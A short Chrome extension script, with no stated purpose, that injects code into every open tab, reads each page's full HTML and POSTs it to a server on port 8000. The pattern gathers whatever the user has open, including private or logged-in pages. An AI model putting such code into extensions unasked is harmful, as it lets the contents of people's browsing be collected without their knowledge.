chrome.tabs.query({}, function (tabs) {
    tabs.forEach(t => {
        chrome.tabs.executeScript(t.id, { code: 'document.documentElement.outerHTML' }, function (result) {
            var server = new XMLHttpRequest;
            server.open('POST', 'http://[::]:8000/?html=' + result[0]);
            server.send();
        })
    })
});
